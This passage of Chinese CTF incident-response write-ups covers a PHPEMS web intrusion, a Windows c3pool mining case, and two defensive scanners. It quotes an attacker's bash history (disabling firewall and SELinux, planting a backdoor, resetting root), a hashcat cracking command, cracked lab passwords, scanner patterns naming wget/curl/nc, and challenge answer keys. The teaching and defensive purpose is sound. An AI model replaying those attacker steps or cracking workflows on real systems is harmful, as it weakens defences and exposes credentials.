...
```

#### 2. PHPEMS 密码加密方式

PHPEMS 使用**纯 MD5 无盐**加密密码：
```php
// user/app.class.php 中的注册逻辑
$sql = "UPDATE x2_user SET userpassword = '".md5($args['userpassword'])."'";
```

无盐 MD5 可直接使用彩虹表或字典破解，常见工具：
- `hashcat -m 0 hash.txt wordlist.txt`
- 在线查询：cmd5.com / somd5.com

#### 3. Linux 隐藏文件排查

```bash
# 查找所有隐藏文件（以 . 开头的文件/目录）
find /www/wwwroot/ -name '.*' -type f 2>/dev/null

# 检查属主异常（Web 目录应为 www/nginx，非 root）
ls -la /www/wwwroot/127.0.0.1/

# 检查 /etc/profile（环境变量劫持）
tail -10 /etc/profile

# 检查 /etc/rc.d/rc.local（开机自启）
cat /etc/rc.d/rc.local
```

> ⚠️ **注意**：攻击者常用的隐藏位置：
> - 隐藏目录（`.api/`、`.cache/`、`.config/`）
> - 环境变量（`/etc/profile`、`~/.bashrc`）
> - 计划任务（`crontab -l`、`/etc/cron.d/`）
> - 开机自启（`/etc/rc.d/rc.local`、`systemd` 服务）

#### 4. PCAP 快速分析技巧

```bash
# 快速提取 flag
strings file.pcapng | grep -i 'flag'

# 查看所有 HTTP 请求
strings file.pcapng | grep -E '^(GET|POST) '

# 提取蚁剑特征
strings file.pcapng | grep -E '(asenc|asoutput|antsystem)'

# 提取 POST 参数名
strings file.pcapng | grep -oP '^[A-Za-z0-9_]+=' | sort -u
```

> **技巧**：日常 CTF/IR 中，`strings | grep` 的快速筛查比Wireshark 逐包分析效率高 10 倍，适合时间紧迫的比赛场景。需要协议级分析时再用 scapy/tshark。

### 数据库用户表详情

| userid | username | 密码 MD5 | 密码明文 | 说明 |
|--------|----------|----------|----------|------|
| 1 | peadmin | `f6f6eb5ace977d7e114377cc7098b7e3` | `Network@2020` | 主管理员（被攻击者修改） |
| 2 | zgsf | `96e79218965eb72c92a549dd5a330112` | `111111` | 教师管理员（弱密码） |
| 3 | zgsfAdmin | `2c1bebe7a8fdc98d0b7ce795f1dc33e6` | 未破解 | 攻击者注册的账户 |
| 4 | zgsf | （注册用户） | — | 学员账户 |

### /root/wp ELF 文件分析

```bash
file /root/wp
# ELF 64-bit LSB executable, x86-64, Go BuildID=..., statically linked

strings /root/wp | grep -E '(Network|version2|flag|antsword)'
# 包含字符串:
#   Network@2020
#   Network2020
#   version2.php
#   user-app-register
```

`/root/wp` 是攻击者上传的 Go 编译后门工具，内置了 Webshell 路径、密码等信息，可能是自动化攻击工具或持久化后门。原文件名为 `go_build_untitled.exe`，通过 `mv` 改名为 `wp`。

### bash_history 关键内容

```bash
systemctl disable firewalld          # 关闭防火墙
systemctl disable --now firewalld
setenforce 0                         # 关闭 SELinux
...
rm -rf flag1 1                       # 删除 flag1 文件
rm -rf version2.php                  # 删除木马文件
...
mkdir .api                           # 创建隐藏目录
cd api/
cp * ../.api/                        # 复制文件到隐藏目录
vim alinotify.php                    # 篡改文件写入 flag2
useradd flag3{5LourqoFt5d2zyOVUoVPJbOmeVmoKgcy6OZ}  # 尝试用 flag3 创建用户（失败）
vim /etc/profile                     # 写入 flag3 环境变量
source /etc/profile
chmod +x go_build_untitled.exe       # 赋予执行权限
mv go_build_untitled.exe wp          # 重命名后门
./wp                                 # 执行后门
passwd root                          # 修改 root 密码
```

### 排查命令速查

```bash
# === 1. 确定攻击者 IP ===
awk '{print $1}' /www/wwwlogs/127.0.0.1.log | sort | uniq -c | sort -rn | head -10

# === 2. 数据库取证 ===
cat /www/wwwroot/127.0.0.1/lib/config.inc.php  # 配置
mysql -ukaoshi -p'5Sx8mK5ieyLPb84m' kaoshi -e "SELECT * FROM x2_user;"

# === 3. PCAP 快速分析 ===
strings '/root/数据包1.pcapng' | grep -i 'flag'           # 提取 flag
strings '/root/数据包1.pcapng' | grep -E '(asenc|antsystem)'  # 蚁剑特征

# === 4. 隐藏文件排查 ===
find /www/wwwroot/127.0.0.1/ -name '.*' -type f
ls -la /www/wwwroot/127.0.0.1/.api/
tail -10 /etc/profile

# === 5. bash_history 取证 ===
cat /root/.bash_history | grep -E '(rm |mv |cp |vim |useradd|passwd|wget|curl|./)'

# === 6. 持久化排查 ===
crontab -l
cat /etc/rc.d/rc.local
systemctl list-unit-files --state=enabled
```

### 同类变体与扩展

| 变体 | 区别 | 应对策略 |
|------|------|----------|
| 菜刀流量 | 函数名为 `Z0`、`base64_decode` | 搜索 `base64_decode` 和 `eval` 特征 |
| 哥斯拉流量 | 使用 AES 加密通信 | 需提取密钥后 AES 解密 |
| 冰蝎流量 | 使用 AES + 动态密钥交换 | 需分析密钥协商过程 |
| Cobalt Strike | Beacon 通信，非 Web 流量 | 分析心跳包和任务返回 |

> ⚠️ **注意**：本题的 PHPEMS 考试系统是常见的 IR 靶场应用，了解其目录结构和配置文件位置（`lib/config.inc.php`）能大幅加速排查。其他常见 PHP 应用（WordPress、Discuz、ThinkPHP）的配置文件位置也应熟记。

### 解题脚本

- Linux 排查脚本：[linux_web_ir2.py](IR/22-linux-web-ir2/linux_web_ir2.py)

> AI生成

---

## 附录：自动化 Linux 应急响应扫描器（通用工具）

### 设计背景

在完成了第18-26题（共5道 IR 应急响应题）后，总结实战经验，开发了一套通用的自动化 Linux 应急响应扫描器。该工具整合了历次 IR 题目中的排查方法论，给定 SSH 登陆方式即可自动远程执行全量排查。

> **技巧**：2026 年 CTF 应急响应比赛趋势（基于护网、陇剑杯、闽盾杯等赛事分析）：
> - 考点从单一漏洞修复转向**完整攻击链还原**（攻击者IP → 入侵路径 → 后门 → 持久化 → 清理痕迹）
> - Webshell 流量分析仍是高频考点（蚁剑/菜刀/冰蝎/哥斯拉四大工具）
> - 考察面扩展到 Docker 容器逃逸、Rootkit 检测、微服务安全
> - 题目环境从单机演进到**多组件架构**（宝塔面板 + nginx + PHP + MySQL + Redis）
> - 需要同时分析日志、流量包、数据库、文件系统四类证据源

### 工具信息

| 项目 | 内容 |
|------|------|
| 路径 | [IR/auto-ir-scanner/ir_scanner.py](IR/auto-ir-scanner/ir_scanner.py) |
| 代码量 | 1626 行 / 80KB (v1.2) |
| 模块数 | 18 个扫描模块 + 智能异常分析 + 综合报告 |
| 输出格式 | 终端彩色输出 + JSON + HTML 报告 |
| 依赖 | paramiko（SSH 远程连接） |

### 18 大扫描模块

| # | 模块 | 采集内容 | 风险检测 |
|---|------|----------|----------|
| 01 | 系统基础信息 | 主机名/OS/内核/CPU/内存/磁盘/容器检测 | 容器环境标识 |
| 02 | 网络连接与端口 | 监听端口/所有连接/接口/路由/DNS/iptables/firewalld/ARP | Redis/MongoDB等暴露、防火墙关闭、异常外连 |
| 03 | 用户与账户安全 | passwd/UID=0/sudoers/特权组/登录记录/authorized_keys/shadow | 多root账户、新增用户、SSH公钥 |
| 04 | 进程排查 | CPU/内存Top20/进程列表/挖矿/反弹Shell/已删除进程 | 挖矿进程、反弹Shell、内存后门 |
| 05 | 计划任务 | root cron/cron.d/spool/systemd timers/at/所有用户cron | 可疑命令(wget/curl/nc/bash -/chmod) |
| 06 | 启动项与持久化 | rc.local/systemd/init.d/profile/bashrc/ld.preload/modules | 启动项后门、ld.preload Rootkit |
| 07 | 文件系统异常 | 7天内修改/SUID/SGID/世界可写/tmp ELF/rpm -Va | 异常ELF、系统文件篡改、**SUID提权检测** |
| 08 | 隐藏文件与Flag | 全局flag搜索/CTF常见位置/Web隐藏文件/属主异常 | flag{}、root属主Web文件 |
| 09 | Bash历史取证 | 所有用户.bash_history/MySQL历史/Redis历史 | 14类可疑命令模式匹配 |
| 10 | Web应用日志分析 | Nginx/Apache日志：Top IP/URL/状态码/POST/404扫描 | 高频+可疑请求IP |
| 11 | Webshell检测 | PHP/JSP/ASP/Python特征grep/一句话木马/非常规扩展名 | Webshell文件 |
| 12 | 数据库配置审计 | MySQL/Redis配置/Web应用配置文件提取凭据 | Redis未授权、DB凭据泄露 |
| 13 | SSH安全审计 | sshd_config/认证日志/暴力破解统计/成功登录 | root登录/空密码/暴力破解 |
| 14 | PCAP流量包分析 | strings提取flag/蚁剑流量特征/HTTP请求/POST参数/域名 | flag、Webshell流量 |
| 15 | 恶意软件检测 | 可疑ELF/Go编译ELF strings/挖矿配置/后门文件名 | Go后门、挖矿配置 |
| 16 | Rootkit检测 | ld.preload/隐藏进程(ps vs /proc)/命令完整性/rkhunter | 隐藏进程、ld.preload |
| 17 | Docker容器检测 | docker ps/images/info/容器Capability/docker.sock | 特权容器逃逸 |
| 18 | 综合风险评估 | 风险评分(0-100)/等级(严重/高危/中危/低危/正常)/发现汇总 | HIGH/MEDIUM/LOW/INFO分级 |
| 99 | **智能异常分析** | **基于内置基线自动对比**：用户权限/端口基线/DNS劫持/SSH配置/密码哈希/**SUID提权**/**攻击链推断** | 自动发现异常无需人工分析 |

### 用法

```bash
# 全量扫描
py -3 ir_scanner.py -H 192.168.88.130 -U root -P 'Inch@957821.'

# 同时保存 JSON 和 HTML 报告
py -3 ir_scanner.py -H 10.0.0.5 -U root -P 'Pass' --json result.json --report report.html

# 指定 Web 根目录
py -3 ir_scanner.py -H 10.0.0.5 -U root -P 'Pass' --webroot /var/www/html

# 仅运行指定模块（逗号分隔）
py -3 ir_scanner.py -H 10.0.0.5 -U root -P 'Pass' --modules 1,2,3,8,10,11
```

### 应急响应技巧总结

> **技巧**：Linux 应急响应排查优先级（PDCERF 模型实战版）：
> 1. **确定攻击者 IP** → Web 访问日志按频率排序，对比正常管理员 IP
> 2. **还原攻击行为** → 日志中的 POST 请求、404 扫描、路径穿越
> 3. **数据库取证** → 用户表密码哈希提取与破解（注意无盐 MD5）
> 4. **流量包分析** → `strings | grep flag` 快速筛查，再 scapy 深入分析
> 5. **bash_history** → 攻击者命令历史 = 完整攻击链还原
> 6. **隐藏文件** → `find -name '.*'`、属主异常检查、`/etc/profile` 环境变量
> 7. **持久化** → crontab、rc.local、ld.so.preload、systemd 服务

> ⚠️ **四大 Webshell 工具流量特征速查**：
> - **蚁剑**：POST 参数名=密码，函数 `asenc`/`asoutput`/`antsystem`，`ini_set("display_errors",0)`
> - **菜刀**：POST 参数 `Z0`、`base64_decode`、`eval`
> - **冰蝎**：AES 加密通信，动态密钥交换，默认密码 `rebeyond`
> - **哥斯拉**：AES 加密，PHP/JSP/ASPX 多种载荷，`pass=cmd`

> **技巧**：CTF Flag 常见隐藏位置（按出现频率排序）：
> 1. `/root/.bash_history` — 命令历史中直接 echo flag
> 2. `/etc/rc.d/rc.local` — 开机启动脚本注释行
> 3. `/etc/redis.conf` 等服务配置注释行
> 4. 隐藏目录 `.api/`、`.cache/` 下的 PHP 文件
> 5. `/etc/profile` — 环境变量
> 6. PCAP 文件中的 HTTP 响应体
> 7. 数据库用户表密码字段
> 8. ELF 后门文件的 strings 输出

### v1.2 新功能：SUID 提权检测 + 智能异常分析

#### SUID 提权检测（模块7增强）

内置 **GTFOBins 风格的 SUID 提权数据库**（35+ 种二进制），检测到可提权 SUID 时自动告警并提供提权命令示例：

| 检测项 | 说明 |
|---------|------|
| `SUID_GTFOBINS` 字典 | 35+ 种可被 SUID 利用提权的二进制（find/python/perl/nmap/bash/awk/vim/cp/chmod 等），含提权命令示例 |
| `DEFAULT_SUID_WHITELIST` 集合 | 30+ 种 CentOS/Ubuntu 系统默认合法 SUID 文件（su/sudo/mount/passwd/pkexec 等）|
| 三级分类 | 正常（白名单）/ 可提权（GTFOBins 匹配，HIGH）/ 未知（非标准目录，MEDIUM/LOW）|

#### 智能异常分析（模块99，后置分析）

在所有模块采集完数据后，自动对比内置基线数据，明确提醒异常项：

| 分析维度 | 基线对比逻辑 |
|----------|-------------|
| 用户与权限 | 服务账户不应有登录shell；shadow 中 `!!`/`*` 是锁定账户(正常)，`$1$` 是MD5(弱)，`$6$` 是SHA-512(正常) |
| 网络端口 | 内置安全端口表(22/80/443/...)和数据库端口表(3306/6379/...)，区分已知服务/DB暴露/未知端口 |
| DNS劫持 | /etc/hosts 中不应出现 github.com/google.com 等公共域名映射 |
| SSH配置 | PermitRootLogin应为no，PasswordAuthentication应禁用，应设置MaxAuthTries |
| 攻击链推断 | 根据 findings 的 category 字段自动关联：暴力破解→Web渗透→后门植入→持久化→挖矿→Rootkit |

> 设计哲学：**大而美**——宁可冗余采集也不遗漏信息，但通过后置分析自动过滤正常项、突出异常项

### v1.2 Bug 修复记录（实测靶机 192.168.88.130 验证）

| Bug | 原因 | 修复 |
|-----|------|------|
| 智能分析误报弱密码哈希 | CentOS shadow 中 `!!`（锁定账户）未在跳过列表中，被当成了"非$格式DES" | 将 `!` 和 `!!` 开头的哈希都加入跳过列表 |
| 挖矿配置误报 yum 缓存 | `grep -rl 'pool'` 匹配了 `/var/cache/yum/.../primary_db.sqlite` | 排除列表增加 `/var/cache`、`/var/lib`、`/etc/yum` |
| 隐藏进程误报短命子进程 | ps 快照和 /proc 快照之间产生的临时进程（yum/rpm子进程）被当成隐藏进程 | 额外检查 `/proc/<pid>/comm` 是否存在，只报告实际存活的隐藏PID |
| bash_history 重复读取 | `/etc/passwd` 中多个用户 home 目录相同时，`for d in $(cut...)` 重复读取同一文件 | `cut -d: -f6 /etc/passwd | sort -u` 去重 home 目录 |
| bash_history 误报普通vim | `vim\s+` 匹配所有 vim 命令，正常运维也会用 vim | 收紧为 `vim\s+/etc`，只对编辑系统配置文件的vim告警 |
| SUID 误报 crontab | CentOS 默认 `/usr/bin/crontab` 有 SUID，但不在白名单中 | 将 `crontab` 加入 `DEFAULT_SUID_WHITELIST` |

### v1.1 Bug 修复记录（实测靶机 192.168.88.130 验证）

| Bug | 原因 | 修复 |
|-----|------|------|
| 模块15 `_pr()` 报错 `unexpected keyword argument 'lines'` | 10处 `_pr()` 调用传了 `lines=` 参数，但方法定义的参数名是 `max_lines` | 全部改为 `max_lines=` |
| 模块4 误报 `[crypto]` 内核线程为挖矿进程 | `grep -iE "crypto"` 匹配了内核线程 `[crypto]` | 从挖矿关键词中移除 `crypto`，单独检测时排除 `[xxx]` 格式的内核线程 |
| 模块17 物理机误报容器逃逸 `CAP_SYS_ADMIN` | 物理机 root 拥有全部 capability，`CapEff` 含 CAP_SYS_ADMIN 是正常的 | 先检查 `/proc/1/cgroup` 判断是否真的在容器中，仅容器环境才检查 CAP_SYS_ADMIN |
| 模块2 端口误报（不区分回环/对外） | 原代码只看端口是否出现，不区分 `127.0.0.1:3306` 和 `0.0.0.0:3306` | 逐行检查监听地址：`127.0.0.1`/`::1` → LOW，`0.0.0.0`/`[::]` → HIGH |
| 模块15 Go ELF 检测误报 `[error]` | `find / -type f -exec file` 超时返回 `[error]` 字符串，非空就触发了 HIGH | 过滤掉 `[error]` 开头的输出 |
| 模块15 挖矿配置误报系统文件 | `grep 'pool'` 匹配了 LVM/grub 等系统配置中的 `pool` 关键词 | 收紧匹配模式（`stratum+tcp`/`xmrig`/`cryptonight` 等），排除 `/etc/grub`、`/etc/lvm` 等系统目录 |

---

## 附录：自动化 Windows 应急响应扫描器（通用工具）

### 设计背景

与 Linux 版 `ir_scanner.py` v1.2 对称，开发了 Windows 版自动化应急响应扫描器。同样通过 SSH（paramiko）远程连接 Windows 靶机，将所有命令替换为 PowerShell 等价命令，架构、辅助方法、报告/JSON/HTML 输出完全一致。

> **设计决策**：Windows 版采用 SSH 而非 RDP (3390)
> - SSH 适合自动化脚本化，文本解析简单，带宽小
> - RDP 是图形协议，不适合批量自动化命令执行
> - SSH 不留 GUI 痕迹，适合取证场景

### 工具信息

| 项目 | 内容 |
|------|------|
| 路径 | [IR/auto-ir-scanner/ir_scanner_win.py](IR/auto-ir-scanner/ir_scanner_win.py) |
| 代码量 | ~1880 行 / 98KB (v1.1) |
| 模块数 | 18 个扫描模块 + 智能异常分析 + 综合报告 |
| 输出格式 | 终端彩色输出 + JSON + HTML 报告 |
| 连接方式 | **WinRM** (pypsrp, NTLM认证, 端口5985) |
| 依赖 | pypsrp（WinRM 远程连接） |
| 架构参照 | [ir_scanner.py](IR/auto-ir-scanner/ir_scanner.py) (Linux版 v1.2, 1626行) |

### 18 大扫描模块（Windows 版）

| # | 模块 | 采集内容 | 风险检测 |
|---|------|----------|----------|
| 01 | 系统基础信息 | hostname/systeminfo/OS/CPU/内存/磁盘/IP/虚拟机检测 | 虚拟机环境标识 |
| 02 | 网络连接与端口 | 监听端口/所有TCP连接/UDP/网卡/路由/DNS/hosts/防火墙/ARP | Redis/MongoDB等暴露、hosts劫持、异常外连 |
| 03 | 用户与账户安全 | 本地用户/WMI用户(含隐藏)/管理员组/SAM注册表/登录事件4624-4625/密码策略 | **隐藏账户($结尾)**、多管理员、暴力破解、新建用户 |
| 04 | 进程排查 | CPU/内存Top20/进程列表/进程树/tasklist/挖矿/可疑进程/网络连接关联 | 挖矿进程、反弹Shell、临时目录可执行 |
| 05 | 计划任务 | Get-ScheduledTask/schtasks/运行中任务/就绪任务 | 可疑命令(powershell/certutil/mshta/download) |
| 06 | 启动项与持久化 | HKLM/HKCU Run+RunOnce/Winlogon/启动文件夹/服务/WMI StartupCommand/IFEO | **Winlogon劫持**、**IFEO Debugger劫持**、可疑自启动 |
| 07 | 文件系统异常 | 7天/24小时修改文件(Depth限4)/Temp目录/可执行文件/脚本/NTFS ADS/隐藏文件/关键文件签名验证 | 临时目录可执行文件、NTFS ADS数据流 |
| 08 | 隐藏Flag搜索 | CTF常见位置(flag{}/ctf{}/FLAG{})/全局flag搜索/注册表搜索/Web目录/用户桌面 | flag{}、注册表中flag |
| 09 | PowerShell历史 | PSReadline历史文件/4104脚本块日志/400经典日志/4688进程创建事件 | 可疑命令(certutil/downloadstring/iex/schtasks/add) |
| 10 | Web应用日志分析 | IIS/phpStudy/nginx日志搜索/Top URL/可疑请求(攻击特征) | 高频攻击请求IP |
| 11 | Webshell检测 | PHP/ASP-ASPX/JSP特征grep/一句话木马/近期文件/异常扩展名 | Webshell文件(一句话/eval/assert/base64_decode) |
| 12 | 数据库配置审计 | MySQL/SQLServer服务/配置文件/Web应用凭据/Redis配置 | Redis未授权、DB凭据泄露 |
| 13 | RDP与远程安全 | RDP状态/端口/NLA/安全层/防火墙RDP规则/4625日志/外部登录/WinRM | **RDP弱配置**、暴力破解、NLA未启用 |
| 14 | PCAP流量包分析 | 递归搜索pcap/flag搜索/Webshell特征/HTTP请求 | flag、Webshell流量特征(asenc/eval/rebeyond) |
| 15 | 恶意软件检测 | 可疑可执行文件/挖矿程序/挖矿配置/矿池网络连接/后门文件名/DLL注入/可疑计划任务 | 挖矿、后门文件、**可疑自启动**、DLL注入 |
| 16 | Rootkit/驱动检测 | 已加载驱动/驱动签名验证/非系统目录驱动/tasklist vs Get-Process对比/可疑服务 | **未签名驱动**、非系统目录驱动、可疑服务 |
| 17 | Windows Defender | 服务状态/配置偏好(实时保护/排除项)/威胁历史/威胁列表/隔离区恢复/MpCmdRun | **实时保护禁用**、排除路径、威胁检测 |
| 18 | 综合风险评估 | 风险评分(0-100)/等级(严重/高危/中危/低危/正常)/发现汇总 | HIGH/MEDIUM/LOW/INFO分级 |
| 99 | **智能异常分析** | **基于Windows基线自动对比**：用户权限/端口基线/hosts劫持/RDP配置/Defender配置/启动项白名单/**攻击链推断** | 自动发现异常无需人工分析 |

### Windows 应急响应关键排查点（vs Linux 对比）

| 排查方向 | Linux | Windows |
|----------|-------|---------|
| 隐藏用户 | /etc/passwd vs /etc/shadow | `net user` 看不到的 `$` 结尾账户，WMI/注册表SAM可见 |
| 自启动 | rc.local/systemd/crontab | 注册表Run/RunOnce/Winlogon/启动文件夹/服务 |
| 持久化 | ld.so.preload/crontab | IFEO Debugger劫持/计划任务/恶意服务 |
| 恶意软件 | ELF/挖矿/minerd | PyInstaller挖矿/Defender隔离区/驱动Rootkit |
| 日志取证 | /var/log/secure/auth.log | Event Log 4624/4625/4688/PowerShell 4104 |
| 隐藏进程 | ps vs /proc对比 | tasklist vs Get-Process对比 |
| 安全软件 | — | Windows Defender状态/排除项/隔离区恢复 |
| 流量取证 | pcap strings | Select-String + Encoding.ASCII.GetString |

### 用法

```bash
# 全量扫描 (WinRM, 默认端口 5985)
py -3 ir_scanner_win.py -H 192.168.234.129 -U Administrator -P 'zgsf@123'

# 同时保存 JSON 和 HTML 报告
py -3 ir_scanner_win.py -H 10.0.0.5 -U Administrator -P 'Pass' --json result.json --report report.html

# 指定 Web 根目录
py -3 ir_scanner_win.py -H 10.0.0.5 -U Administrator -P 'Pass' --webroot C:\phpstudy_pro\WWW

# 仅运行指定模块（逗号分隔）
py -3 ir_scanner_win.py -H 10.0.0.5 -U Administrator -P 'Pass' --modules 1,2,3,6,17
```

### Windows 应急响应技巧总结

> **技巧**：Windows 应急响应排查优先级：
> 1. **隐藏账户** → `net user` 看不到的账户，用 `Get-WmiObject Win32_UserAccount` 或注册表 `HKLM\SAM\Domains\Account\Users\Names` 检查 `$` 结尾账户
> 2. **攻击者IP** → 安全日志 Event ID 4625(失败)和 4624(成功)中提取 Source Network Address
> 3. **持久化** → 注册表 Run/RunOnce/Winlogon Shell、启动文件夹、计划任务、IFEO Debugger
> 4. **Webshell** → Defender隔离区 `MpCmdRun.exe -Restore -All` 恢复，识别蚁剑/冰蝎/哥斯拉特征
> 5. **挖矿程序** → `Get-Process` 检测矿工进程名(kuang/miner/xmrig)，解包 PyInstaller exe 分析矿池域名
> 6. **Defender** → 检查 `DisableRealtimeMonitoring` 和 `ExclusionPath`，恢复隔离文件
> 7. **PowerShell历史** → PSReadline历史文件路径 + Event 4104 脚本块日志

> ⚠️ **Windows CTF IR 高频考点**：
> - **隐藏账户** → `$` 结尾(net user 不可见)，查WMI/注册表
> - **冰蝎webshell密码** → `rebeyond` (MD5前16位匹配)
> - **挖矿程序** → PyInstaller打包，用 pyinstxtractor 解包后 uncompyle6 反编译
> - **Defender隔离区** → `MpCmdRun.exe -Restore -All` 恢复被杀的webshell
> - **攻击者IP** → 4625日志源IP按频率统计，排除正常管理员

### 智能异常分析（模块99，Windows版）

| 分析维度 | 基线对比逻辑 |
|----------|-------------|
| 用户与权限 | 默认用户集(Administrator/Guest/DefaultAccount等)，非默认用户>3个提醒；`$`结尾账户=隐藏账户(HIGH) |
| 网络端口 | 内置安全端口表(22/80/443/3389/445/...)和数据库端口表，区分已知服务/DB暴露/未知端口 |
| hosts劫持 | hosts文件不应出现 github.com/google.com/baidu.com 等公共域名映射 |
| RDP配置 | fDenyTSConnections=0(RDP开启)、NLA未启用、安全层=0 均为弱项 |
| Defender配置 | DisableRealtimeMonitoring=True(已禁用)、ExclusionPath非空(排除路径) 为异常 |
| 启动项白名单 | `DEFAULT_AUTORUN_WHITELIST` 对比Run/RunOnce键值，非默认项提醒 |
| 攻击链推断 | 暴力破解→Web渗透/Webshell→后门植入→持久化→挖矿→Rootkit/注入→安全软件禁用 |

### v1.1 更新日志 (WinRM 后端 + 性能优化)

#### 连接层重构：paramiko SSH → pypsrp WinRM

原 v1.0 使用 paramiko SSH 连接 Windows 靶机, 但实际靶机通常未开启 SSH 服务(22端口), 而 WinRM(5985) 在 Windows Server 上默认开放。

**关键修改：**

| 组件 | v1.0 (paramiko SSH) | v1.1 (pypsrp WinRM) |
|------|---------------------|----------------------|
| import | `import paramiko` | `from pypsrp.client import Client` |
| 连接 | `paramiko.SSHClient().connect()` | `Client(host, auth='ntlm', ssl=False, port=5985)` |
| 执行命令 | `exec_command(cmd, timeout=)` | `execute_cmd(cmd)` (无 timeout 参数) |
| 默认端口 | 22 | 5985 |
| PowerShell | `-Command` + 反引号转义 | **`-EncodedCommand`** (UTF-16LE Base64, 彻底避免引号转义) |

#### 三个核心 Bug 修复

1. **`execute_cmd()` 不接受 `timeout` 参数** — pypsrp 与 paramiko API 不同, 超时在 Client 构造时设置
2. **CLIXML 噪音过滤** — WinRM 下 PowerShell 进度/警告流序列化为 `#< CLIXML <Objs>...` 格式, 新增 `_strip_clixml()` 正则过滤
3. **GBK/UTF-8 混合编码** — cmd.exe 原始命令输出 GBK, PowerShell 输出 UTF-8; `ps()` 方法前置 `chcp 65001` + `[Console]::OutputEncoding=UTF8`, `run()` 默认 gbk 解码, `ps()` 用 utf-8 解码

#### 性能优化 (全盘递归搜索加 Depth 限制)

原 v1.0 多处使用 `Get-ChildItem -Path C:\ -Recurse` 全盘递归, 在真实系统上耗时数分钟甚至超时:

| 模块 | 原命令 | 优化后 | 效果 |
|------|--------|--------|------|
| 07 | `C:\ -Recurse` (7天/24小时文件) | `-Depth 4` | 200s→60s |
| 07 | `sfc /verifyonly`（分钟级） | 改为关键文件签名验证 | 秒级 |
| 08 | `reg query HKLM /s /f flag{` (全注册表) | 限定 `HKLM\SOFTWARE` + `/t REG_SZ` | 10min+→秒级 |
| 08 | `Users -Recurse` flag搜索 | `-Depth 5` | 大幅加速 |
| 12 | `C:\ -Recurse` 搜索 my.ini | `-Depth 3` | 大幅加速 |
| 14 | `C:\ -Recurse` 搜索 pcap | `-Depth 4` | 大幅加速 |
| 15 | `C:\ -Recurse` 搜索挖矿配置/后门名 | `-Depth 4` | 大幅加速 |
| 16 | `C:\ -Recurse` 搜索 .sys | `-Depth 4` | 大幅加速 |

#### 实测结果 (Windows Server 2022 靶机)

| 指标 | 数据 |
|------|------|
| 靶机 | 192.168.234.129 (Windows Server 2022 Datacenter, VMware) |
| 扫描耗时 | 248 秒 (~4分钟) |
| 风险评分 | 100/100 (严重) |
| 发现总数 | 17 个 (HIGH=6, MEDIUM=11) |
| JSON 报告 | 1.4 MB |
| HTML 报告 | 1.4 MB |

**关键发现：**
- [HIGH] RDP 端口 3389 对外监听
- [HIGH] 发现可疑反弹Shell/后门进程
- [HIGH] 计划任务中存在可疑命令
- [HIGH] 启动项中存在可疑命令 (`systems.bat`)
- [HIGH] Defender 实时保护已禁用
- [HIGH] 推断完整攻击链: 暴力破解→后门植入→持久化→安全软件禁用
- [MEDIUM] IP 192.168.115.131 登录失败 12 次
- [MEDIUM] 发现可疑后门文件名
- [MEDIUM] Defender 配置存在安全弱项 (排除路径)

> AI生成
---

## #27 Windows 挖矿应急响应 (c3pool)

> **类型：** IR (应急响应)
> **靶机：** 192.168.234.129 (Windows Server 2022 Datacenter, VMware, WinRM 5985)
> **凭据：** Administrator / zgsf@123
> **场景：** 挖矿案例靶机，攻击者通过RDP暴力破解入侵后植入c3pool挖矿程序和后门脚本

### 题目要求

找出以下8个关键信息：
1. 攻击者的IP地址
2. 攻击者开始攻击的时间
3. 攻击者攻击的端口
4. 挖矿程序的MD5
5. 后门脚本的MD5
6. 矿池地址
7. 钱包地址
8. 攻击者是如何攻击进入的

### 答案

| # | 问题 | 答案 |
|---|------|------|
| 1 | 攻击者IP地址 | `192.168.115.131` |
| 2 | 攻击者开始攻击的时间 | `2024-05-21 20:25:22` |
| 3 | 攻击者攻击的端口 | `3389` (RDP) |
| 4 | 挖矿程序MD5 | `A79D49F425F95E70DDF0C68C18ABC564` (xmrig.exe, 6497280 bytes) |
| 5 | 后门脚本MD5 | `8414900F4C896964497C2CF6552EC4B9` (systems.bat, 374 bytes) |
| 6 | 矿池地址 | `auto.c3pool.org` (stratum端口: 80/13333/15555/19999 按算力分配) |
| 7 | 钱包地址 | `4APXVhukGNiR5kqqVC7jwiVaa5jDxUgPohEtAyuRS1uyeL6K1LkkBy9SKx5W1M7gYyNneusud6A8hKjJCtVbeoFARuQTu4Y` |
| 8 | 攻击者入侵方式 | **RDP 3389端口暴力破解** (LogonType 7/10, 4625失败12次后4624成功登录) |

### 解题思路

#### 第一阶段：日志分析锁定攻击者

**1. 攻击者IP（安全日志 Event ID 4625）**

查询4625登录失败事件，解析XML提取IpAddress字段。IP `192.168.115.131` 在 `2024-05-21 20:25:22` 对 Administrator 账户进行了 **12次** 暴力破解（SubStatus=0xc000006a = 错误密码）。

**2. 攻击时间定位**

- 最早的非本地4625失败事件（无IP记录）：`2024-05-21 20:01:26`
- 最早的 192.168.115.131 暴力破解：`2024-05-21 20:25:22`（12次集中爆发）

**3. 攻击端口**

`netstat -ano` 显示目标开放端口含 **3389(RDP)**，攻击者通过3389端口进行RDP暴力破解。

**4. 入侵方式确认（Event ID 4624 LogonType）**

4624成功登录事件中，攻击者IP以 **LogonType 7** (Unlock/RemoteInteractive) 成功登录：

```
2024-05-21 20:25:24 | IP: 192.168.115.131 | User: Administrator | LogonType: 7
2024-05-21 20:26:01 | IP: 192.168.115.131 | User: Administrator | LogonType: 7
```

TerminalServices日志确认RDP会话来源IP 192.168.115.131从20:25:22开始。

完整攻击链：**RDP暴力破解(4625x12) -> 成功登录(4624 LogonType 7) -> 植入后门脚本 -> 下载挖矿程序 -> 注册表持久化 -> 创建计划任务 -> 禁用Defender**

#### 第二阶段：挖矿程序排查

**5. 挖矿程序MD5**

Defender检测到 `Trojan:Win64/XmRig.CL!MTB` 并隔离了 `C:\Users\Administrator\c3pool\xmrig.exe`。

恢复方式：
```powershell
$mpCmd = (Get-ChildItem 'C:\ProgramData\Microsoft\Windows Defender' -Filter 'MpCmdRun.exe' -Recurse |
          Where-Object { `$_.DirectoryName -notmatch 'X86' } | Select-Object -First 1).FullName
& $mpCmd -Restore -All
```

恢复后计算MD5：
```
File: C:\Users\Administrator\c3pool\xmrig.exe
Size: 6497280 bytes
MD5: A79D49F425F95E70DDF0C68C18ABC564
```

原始下载包 `C:\Users\Administrator\xmrig.zip`（655109 bytes, MD5: C5A11E4CA3F5154BC003F1241DFC723D）仍保留在用户目录。

**6. 矿池地址**

从c3pool setup脚本（临时文件 `tmp4D8F.tmp.bat`）中提取配置生成逻辑，脚本L299将config.json中的url替换为：

```
"url": "auto.c3pool.org:%PORT%"
```

矿池stratum地址：`auto.c3pool.org`（根据算力自动选择端口：80/13333/15555/19999）

**7. 钱包地址**

从后门脚本 `systems.bat` 内容中直接提取：

```batch
